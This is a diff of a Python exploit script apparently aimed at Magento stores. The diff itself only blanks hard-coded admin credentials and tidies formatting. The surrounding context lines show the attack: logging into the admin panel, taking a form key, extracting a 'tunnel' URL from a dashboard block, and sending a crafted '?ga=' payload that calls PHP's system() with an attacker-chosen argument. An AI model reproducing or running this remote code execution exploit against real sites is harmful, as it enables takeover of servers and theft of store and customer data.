@@ -31,8 +31,8 @@ target = sys.argv[1]
 arg = sys.argv[2]
 
 # Config.
-username = 'forme'
-password = 'forme'
+username = ''
+password = ''
 php_function = 'system'  # Note: we can only pass 1 argument to the function
 install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
 
@@ -68,7 +68,6 @@ key = key.group(0)
 
 request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
 
-
 tunnel = re.search("(?<=src\=\")[^?]*", request.read().decode('UTF-8'))
 tunnel = tunnel.group(0)
 
@@ -80,6 +79,5 @@ exploit = tunnel + '?ga=' + payload.decode('UTF-8') + '&h=' + gh
 try:
     request = br.open(exploit)
 except (mechanize.HTTPError, mechanize.URLError) as e:
-    print (e.read().decode('UTF-8'))
-    
+    print(e.read().decode('UTF-8'))
     
